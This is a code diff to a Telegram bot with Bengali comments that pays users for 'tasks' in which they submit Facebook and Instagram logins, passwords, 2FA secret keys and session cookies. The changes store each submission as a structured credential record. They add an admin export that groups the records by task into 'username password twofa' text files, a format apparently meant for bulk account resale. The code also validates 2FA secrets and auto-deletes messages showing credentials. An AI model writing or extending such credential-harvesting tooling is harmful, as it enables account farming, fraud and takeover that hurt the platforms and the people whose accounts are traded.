@@ -1,5 +1,6 @@
 import os
 import json
+import re
 import threading
 import datetime
 import uuid
@@ -36,7 +37,6 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "6470499890"))
 # বাধ্যতামূলক চ্যানেলগুলোর ইউজারনেম (বটকে অবশ্যই এই চ্যানেলে এডমিন হতে হবে)
 REQUIRED_CHANNELS = ["@range_channele", "@insagramth"]
 
-ADDING_TASK_NAME = {}  # কে task name যোগ করতে চায় track করতে
 _lock = threading.Lock()
 
 def _style(btn, style_name: str):
@@ -97,10 +97,12 @@ def _firebase_put(data, path=""):
 # ID DUMP (Facebook/Instagram সাবমিশন এখানে জমা হবে, Admin Panel
 # থেকে txt ফাইল হিসেবে ডাউনলোড করলে খালি হয়ে যাবে)
 # ============================================================
-def add_to_id_dump(category: str, entry_text: str):
+def add_to_id_dump(category: str, entry: dict):
     """
-    একটা সাবমিশনের তথ্য Facebook/Instagram ডাম্প লিস্টে যোগ করে (Firebase-এ
-    persist থাকে)। কোনো কারণে ব্যর্থ হলে চুপচাপ log করে, বট থামে না।
+    একটা সাবমিশনের তথ্য (task, username, password, twofa) Facebook/Instagram
+    ডাম্প লিস্টে structured আকারে যোগ করে (Firebase-এ persist থাকে), যাতে
+    পরে টাস্ক অনুযায়ী গ্রুপ করে সাজানো যায়। কোনো কারণে ব্যর্থ হলে চুপচাপ
+    log করে, বট থামে না।
     """
     key = "fb_dump" if category == "facebook" else "ig_dump"
     try:
@@ -108,25 +110,10 @@ def add_to_id_dump(category: str, entry_text: str):
             d = _load()
             if key not in d:
                 d[key] = []
-            d[key].append(entry_text)
+            d[key].append(entry)
             _save(d)
     except Exception as e:
         logger.error(f"ID ডাম্পে যোগ করা যায়নি ({category}): {e}")
-
-# ===================== TASK NAMES STORAGE (Firebase) =====================
-TASK_NAMES_LIST = {}  # মেমরিতে রাখার জন্য (স্টার্টআপে Firebase থেকে load হয়)
-
-def _load_task_names():
-    """সব Task names Firebase থেকে load করুন"""
-    global TASK_NAMES_LIST
-    remote = _firebase_get("task_names_storage")
-    TASK_NAMES_LIST = remote if isinstance(remote, dict) else {}
-
-def _save_task_names():
-    """সব Task names Firebase-এ save করুন"""
-    ok = _firebase_put(TASK_NAMES_LIST, "task_names_storage")
-    if not ok:
-        logger.error("Task names Firebase-এ সেভ করা যায়নি!")
 
 # ============================================================
 # MULTI-LANGUAGE DICTIONARY
@@ -434,22 +421,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # --------------------------------------------------------
     # ADMIN FLOWS
     # --------------------------------------------------------
-    if user_id == ADMIN_ID and ADDING_TASK_NAME.get(user_id, False):
-        ADDING_TASK_NAME.pop(user_id, None)
-        task_name = text.strip()
-        
-        if not task_name:
-            await update.message.reply_text("❌ Task নাম খালি থাকতে পারে না!")
-            return
-        
-        TASK_NAMES_LIST[task_name] = True
-        _save_task_names()
-        
-        await update.message.reply_text(
-            f"✅ Task নাম সফলভাবে যোগ করা হয়েছে!\n\n📝 নাম: {task_name}\n📊 মোট Task নাম: {len(TASK_NAMES_LIST)}",
-            reply_markup=main_menu_keyboard(user_id, lang)
-        )
-        return
 
     if user_id == ADMIN_ID and USER_STATE.get(user_id, {}).get("step") == "admin_change_password":
         USER_STATE.pop(user_id, None)
@@ -668,6 +639,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             USER_STATE.pop(user_id, None)
             await update.message.reply_text(ln["btn_cancel"], reply_markup=main_menu_keyboard(user_id, lang))
             return
+        if len(text.strip()) < 100:
+            await update.message.reply_text("❌ Cookie is too short (minimum 100 characters). Please provide valid cookie data.")
+            return
         USER_STATE[user_id]["cookies_data"] = text
         USER_STATE[user_id]["step"] = "cookies_submitted"
         
@@ -721,12 +695,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption=f"实时 Dynamic 2FA Task\nUser: @{user_profile['username']}\nUID: {user_id}")
             os.remove(file_path)
 
-            dump_entry = (
-                f"সময়: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"Sub ID: {sub_id}\n"
-                f"User: @{user_profile.get('username','')} (UID: {user_id})\n"
-                f"{content_text}"
-            )
+            dump_entry = {
+                "task": state.get("t_name", "অজানা টাস্ক"),
+                "username": state.get('f_name') if state.get("cat") == "facebook" else state.get('login'),
+                "password": state.get('pass', ''),
+                "twofa": state.get('secret', '')
+            }
             add_to_id_dump(state.get("cat", "instagram"), dump_entry)
 
             await update.message.reply_text(ln["report_received"], reply_markup=main_menu_keyboard(user_id, lang))
@@ -754,12 +728,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption=f"🍪 Dynamic Cookies Task Submission\nUser: @{user_profile['username']}\nUID: {user_id}\nSub ID: {sub_id}")
             os.remove(file_path)
 
-            dump_entry = (
-                f"সময়: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"Sub ID: {sub_id}\n"
-                f"User: @{user_profile.get('username','')} (UID: {user_id})\n"
-                f"{content_text}"
-            )
+            dump_entry = {
+                "task": state.get("t_name", "অজানা টাস্ক"),
+                "username": state.get('f_name') if state.get("cat") == "facebook" else state.get('login'),
+                "password": state.get('pass', ''),
+                "twofa": ""
+            }
             add_to_id_dump(state.get("cat", "instagram"), dump_entry)
 
             await update.message.reply_text(ln["report_received"], reply_markup=main_menu_keyboard(user_id, lang))
@@ -772,7 +746,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(ln["btn_cancel"], reply_markup=main_menu_keyboard(user_id, lang))
             USER_STATE.pop(user_id, None)
             return
-        user_secret = text.replace(" ", "")
+        user_secret = text.replace(" ", "").upper()
+
+        # আসল 2FA secret key শুধু A-Z আর 2-7 অক্ষর দিয়ে তৈরি হয় (base32),
+        # আর সাধারণত ১৬-৬৪ ক্যারেক্টার লম্বা হয়। এর বাইরে কিছু হলে (0,1,8,9,
+        # স্পেশাল ক্যারেক্টার, বা খুব ছোট/এলোমেলো টেক্সট) সেটা আসল secret
+        # হতে পারে না — তাই সাথে সাথে বাতিল করে দেওয়া হচ্ছে।
+        is_valid_format = (
+            16 <= len(user_secret) <= 64
+            and re.fullmatch(r"[A-Z2-7]+", user_secret) is not None
+        )
+        if not is_valid_format:
+            await update.message.reply_text(ln["invalid_2fa"])
+            return
         try:
             totp = pyotp.TOTP(user_secret)
             current_code = totp.now()
@@ -909,7 +895,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if text == ln["btn_video"] or text == "🎥 ভিডিও দেখুন":
-        await update.message.reply_text("🎥 Video Link:\n\nhttps://t.me/range_channele/955")
+        state = USER_STATE.get(user_id, {})
+        task_id = state.get("task_id")
+        t_data = db_data.get("dynamic_tasks", {}).get(task_id) if task_id else None
+        if t_data and t_data.get("video_file_id"):
+            await update.message.reply_video(video=t_data["video_file_id"], caption=f"🎥 {t_data['name']} — কীভাবে কাজটি করবেন")
+        else:
+            await update.message.reply_text("❌ এই টাস্কের জন্য এখনো কোনো ভিডিও যুক্ত করা হয়নি।")
         return
 
     if text == ln["btn_start"]:
@@ -942,7 +934,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"Password: `{pass_val}`"
                     )
                     
-                await update.message.reply_text(mono_msg, parse_mode="Markdown")
+                cred_msg = await update.message.reply_text(mono_msg, parse_mode="Markdown")
+                asyncio.create_task(delete_message_after_delay(context, update.effective_chat.id, cred_msg.message_id, 60))
                 
                 if state["task_type"] == "2fa":
                     state["step"] = "waiting_for_2fa"
@@ -993,10 +986,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         btn_all_r = KeyboardButton("🗂️ All Report")
         btn_del_u = KeyboardButton("🗑️ User Delete")
         btn_pwd_t = KeyboardButton("🔐 Password Change")
-        btn_add_tn = KeyboardButton("➕ Add Task Name")
-        btn_del_tn = KeyboardButton("🗑️ Delete Task Name")
         btn_ig_file = KeyboardButton("📷 Instagram File")
         btn_fb_file = KeyboardButton("📘 Facebook File")
+        btn_work_vid = KeyboardButton("🎥 Work Video")
         btn_back_m = KeyboardButton(ln["btn_back"])
         
         _style(btn_add_t, 'success')
@@ -1008,10 +1000,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _style(btn_all_r, 'primary')
         _style(btn_del_u, 'danger')
         _style(btn_pwd_t, 'primary')
-        _style(btn_add_tn, 'success')
-        _style(btn_del_tn, 'danger')
         _style(btn_ig_file, 'primary')
         _style(btn_fb_file, 'primary')
+        _style(btn_work_vid, 'success')
         _style(btn_back_m, 'danger')
         
         kb = ReplyKeyboardMarkup([
@@ -1019,9 +1010,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [btn_vis_t, btn_brd_t],
             [btn_add_m, btn_sav_u],
             [btn_all_r, btn_del_u],
-            [btn_pwd_t, btn_add_tn],
-            [btn_del_tn, btn_ig_file],
-            [btn_fb_file, btn_back_m]
+            [btn_pwd_t, btn_work_vid],
+            [btn_ig_file, btn_fb_file],
+            [btn_back_m]
         ], resize_keyboard=True)
         await update.message.reply_text("🛠️ Admin Control Dashboard", reply_markup=kb)
         return
@@ -1038,10 +1029,25 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"❌ এখনো পর্যন্ত কোনো নতুন {label} সাবমিশন জমা হয়নি।")
                 return
 
+            # টাস্ক নাম অনুযায়ী গ্রুপ করা হচ্ছে
+            grouped = {}
+            for entry in dump_list:
+                task_name = entry.get("task", "অজানা টাস্ক")
+                grouped.setdefault(task_name, []).append(entry)
+
+            blocks = []
+            for task_name, entries in grouped.items():
+                lines = [f"📌 TASK: {task_name}", "=" * 30]
+                for e in entries:
+                    line = f"{e.get('username','')}    {e.get('password','')}"
+                    if e.get("twofa"):
+                        line += f"    {e['twofa']}"
+                    lines.append(line)
+                blocks.append("\n".join(lines))
+
             file_path = f"{key}_{uuid.uuid4().hex[:6]}.txt"
-            separator = "\n" + ("=" * 30) + "\n"
             with open(file_path, "w", encoding="utf-8") as f:
-                f.write(separator.join(dump_list))
+                f.write("\n\n".join(blocks))
 
             # ফাইল পাঠানোর পর এই ক্যাটাগরির ডাম্প খালি করে দেওয়া হচ্ছে,
             # যাতে পরের বার শুধু নতুন সাবমিশনগুলোই থাকে
@@ -1052,7 +1058,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_document(
                 document=f,
                 filename=f"{label}_Submissions.txt",
-                caption=f"📄 মোট {len(dump_list)} টি {label} সাবমিশন। (এই ফাইল পাঠানোর সাথে সাথে লিস্ট খালি হয়ে গেছে, এখন থেকে নতুন সাবমিশন জমা হবে।)"
+                caption=f"📄 মোট {len(dump_list)} টি {label} সাবমিশন, {len(grouped)} টি টাস্কে ভাগ করা। (এই ফাইল পাঠানোর সাথে সাথে লিস্ট খালি হয়ে গেছে, এখন থেকে নতুন সাবমিশন জমা হবে।)"
             )
         os.remove(file_path)
         return
@@ -1063,27 +1069,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"🔐 বর্তমান টাস্ক পাসওয়ার্ড: `{current_pwd}`\n\nনতুন যে পাসওয়ার্ডটি সেট করতে চান তা লিখে পাঠান:", parse_mode="Markdown")
         return
 
-    if user_id == ADMIN_ID and text == "➕ Add Task Name":
-        ADDING_TASK_NAME[user_id] = True
-        await update.message.reply_text("➕ নতুন Task নাম কি দিতে চান?\n\nউদাহরণ: Facebook Money Earn, Instagram Likes Collect, ইত্যাদি")
-        return
-
-    if user_id == ADMIN_ID and text == "🗑️ Delete Task Name":
-        if not TASK_NAMES_LIST:
-            await update.message.reply_text("❌ কোনো Task নাম নেই!")
-            return
-        
-        buttons = []
-        for task_name in TASK_NAMES_LIST.keys():
-            buttons.append([InlineKeyboardButton(
-                text=f"🗑️ {task_name}",
-                callback_data=f"delete_task_name:{task_name}"
-            )])
-        
-        kb = InlineKeyboardMarkup(buttons)
-        await update.message.reply_text("🗑️ ডিলিট করতে Task নাম চাপুন:", reply_markup=kb)
-        return
-
     if user_id == ADMIN_ID and text == "❌ Delete Task":
         btn_del_ig = InlineKeyboardButton("Instagram Tasks", callback_data="adm_del_cat:instagram")
         btn_del_fb = InlineKeyboardButton("Facebook Tasks", callback_data="adm_del_cat:facebook")
@@ -1092,6 +1077,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         kb = InlineKeyboardMarkup([[btn_del_ig, btn_del_fb]])
         await update.message.reply_text("🗑️ কোন ক্যাটাগরির কাজ ডিলিট করতে চান?", reply_markup=kb)
+        return
+
+    if user_id == ADMIN_ID and text == "🎥 Work Video":
+        btn_vid_ig = InlineKeyboardButton("Instagram Tasks", callback_data="adm_vid_cat:instagram")
+        btn_vid_fb = InlineKeyboardButton("Facebook Tasks", callback_data="adm_vid_cat:facebook")
+        _style(btn_vid_ig, 'primary')
+        _style(btn_vid_fb, 'primary')
+
+        kb = InlineKeyboardMarkup([[btn_vid_ig, btn_vid_fb]])
+        await update.message.reply_text("🎥 কোন ক্যাটাগরির টাস্কের ভিডিও সেট করতে চান?", reply_markup=kb)
         return
 
     if user_id == ADMIN_ID and text == "📥 Username Save":
@@ -1206,17 +1201,6 @@ async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await query.answer()
 
-    if data.startswith("delete_task_name:"):
-        task_name = data.replace("delete_task_name:", "")
-        
-        if task_name in TASK_NAMES_LIST:
-            del TASK_NAMES_LIST[task_name]
-            _save_task_names()
-            await query.edit_message_text(
-                f"🗑️ ডিলিট করা হয়েছে!\n\n❌ {task_name}\n\n📊 বাকি Task নাম: {len(TASK_NAMES_LIST)}"
-            )
-        return
-
     if data == "verify_join":
         if await is_user_joined_all(context.bot, user_id):
             try: await query.delete_message()
@@ -1259,21 +1243,6 @@ async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             except:
                 pass
-        return
-
-    if data.startswith("select_task_name:"):
-        task_name = data.replace("select_task_name:", "")
-        
-        btn_cat_ig = InlineKeyboardButton("🔷 Instagram", callback_data=f"adm_cat:instagram:{task_name}")
-        btn_cat_fb = InlineKeyboardButton("🟩 Facebook", callback_data=f"adm_cat:facebook:{task_name}")
-        _style(btn_cat_ig, 'primary')
-        _style(btn_cat_fb, 'success')
-        
-        kb = InlineKeyboardMarkup([[btn_cat_ig, btn_cat_fb]])
-        await query.edit_message_text(
-            text=f"📁 Task: {task_name}\n\nকোন ক্যাটাগরিতে কাজ যুক্ত করতে চান?",
-            reply_markup=kb
-        )
         return
 
     if data == "cancel_add_task":
@@ -1339,6 +1308,37 @@ async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except: pass
         return
 
+    if data.startswith("adm_vid_cat:"):
+        cat = data.split(":")[1]
+        active_tasks = [t for t in db_data.get("dynamic_tasks", {}).values() if t.get("category") == cat]
+        if not active_tasks:
+            await query.message.reply_text("❌ এই ক্যাটাগরিতে কোনো একটিভ টাস্ক পাওয়া যায়নি।")
+            return
+
+        buttons = []
+        for t in active_tasks:
+            has_vid = "🎥" if t.get("video_file_id") else "⬜"
+            btn_t_vid = InlineKeyboardButton(f"{has_vid} {t['name']}", callback_data=f"adm_vid_task:{t['id']}")
+            _style(btn_t_vid, 'primary')
+            buttons.append([btn_t_vid])
+
+        await query.message.reply_text("👇 কোন টাস্কের জন্য ভিডিও সেট করতে চান? (🎥 = আগে থেকেই ভিডিও সেট আছে)", reply_markup=InlineKeyboardMarkup(buttons))
+        try: await query.delete_message()
+        except: pass
+        return
+
+    if data.startswith("adm_vid_task:"):
+        task_id = data.split(":")[1]
+        t_data = db_data.get("dynamic_tasks", {}).get(task_id)
+        if not t_data:
+            await query.message.reply_text("❌ দুঃখিত! টাস্কটি খুঁজে পাওয়া যায়নি।")
+            return
+        USER_STATE[user_id] = {"step": "waiting_for_task_video", "task_id": task_id}
+        await query.message.reply_text(f"🎥 '{t_data['name']}' টাস্কের জন্য এখন একটা ভিডিও পাঠান (ফাইল হিসেবে ভিডিও আপলোড করুন):")
+        try: await query.delete_message()
+        except: pass
+        return
+
     if data.startswith("adm_t_type:"):
         t_type = data.split(":")[1]
         state = USER_STATE.get(user_id)
@@ -1346,7 +1346,8 @@ async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
             t_id = str(uuid.uuid4())[:8]
             new_task = {
                 "id": t_id, "category": state["category"], "name": state.get("selected_task_name") or state.get("task_name"),
-                "price": state.get("task_price", 0.0), "rules": state.get("task_rules", ""), "type": t_type
+                "price": state.get("task_price", 0.0), "rules": state.get("task_rules", ""), "type": t_type,
+                "video_file_id": None
             }
             with _lock:
                 d = _load()
@@ -1481,6 +1482,35 @@ async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except: pass
 
 # ============================================================
+# ADMIN TASK VIDEO UPLOAD HANDLER
+# ============================================================
+async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    এডমিন 'Work Video' ফিচার দিয়ে যখন কোনো টাস্কের জন্য ভিডিও আপলোড করেন,
+    তখন এটা ধরে সেই টাস্কের সাথে ভিডিওটা যুক্ত করে দেয়।
+    """
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        return
+    state = USER_STATE.get(user_id, {})
+    if state.get("step") != "waiting_for_task_video":
+        return
+
+    task_id = state.get("task_id")
+    video_file_id = update.message.video.file_id
+
+    with _lock:
+        d = _load()
+        if task_id in d.get("dynamic_tasks", {}):
+            d["dynamic_tasks"][task_id]["video_file_id"] = video_file_id
+            _save(d)
+            task_name = d["dynamic_tasks"][task_id]["name"]
+            await update.message.reply_text(f"✅ '{task_name}' টাস্কের জন্য ভিডিও সফলভাবে সেট করা হয়েছে!")
+        else:
+            await update.message.reply_text("❌ দুঃখিত! টাস্কটি খুঁজে পাওয়া যায়নি (হয়তো ডিলিট হয়ে গেছে)।")
+    USER_STATE.pop(user_id, None)
+
+# ============================================================
 # GLOBAL ERROR HANDLER
 # ============================================================
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
@@ -1500,12 +1530,28 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
 
     logger.error(f"হ্যান্ডলারে সমস্যা হয়েছে: {err}", exc_info=err)
 
+    # ঠিক কোথায় (কোন ফাইলের কোন লাইনে) এররটা হয়েছে সেটা বের করা হচ্ছে,
+    # যাতে এডমিনকে পাঠানো মেসেজ থেকেই বোঝা যায় সমস্যাটা কোথায় — Render
+    # Logs খুলে খোঁজার দরকার না পড়ে।
+    location = ""
+    try:
+        tb = err.__traceback__
+        last_frame = tb
+        while last_frame.tb_next:
+            last_frame = last_frame.tb_next
+        fname = os.path.basename(last_frame.tb_frame.f_code.co_filename)
+        func_name = last_frame.tb_frame.f_code.co_name
+        line_no = last_frame.tb_lineno
+        location = f"\n\n📍 {fname} → {func_name}() → line {line_no}"
+    except Exception:
+        pass
+
     # চাইলে এডমিনকে জানিয়ে দেওয়া, কিন্তু এটাও ব্যর্থ হলে যেন বট না থামে
     try:
         if ADMIN_ID:
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
-                text=f"⚠️ বটে একটা এরর হয়েছে (স্বয়ংক্রিয়ভাবে সামলানো হয়েছে):\n\n{type(err).__name__}: {err}"
+                text=f"⚠️ বটে একটা এরর হয়েছে (স্বয়ংক্রিয়ভাবে সামলানো হয়েছে):\n\n{type(err).__name__}: {err}{location}"
             )
     except Exception:
         pass
@@ -1539,12 +1585,12 @@ def _run_dummy_server():
 # ============================================================
 
 def main():
-    _load_task_names()
     _load()  # স্টার্টআপেই Firebase থেকে সব ডেটা load করে ক্যাশে বসিয়ে দেয়
     logger.info("Firebase Realtime Database থেকে ডেটা সফলভাবে load হয়েছে।")
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT, handle_message))
+    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
     app.add_handler(CallbackQueryHandler(callback_query))
     app.add_error_handler(error_handler)
     logger.info("Bot fully updated with Custom Report Layouts.")
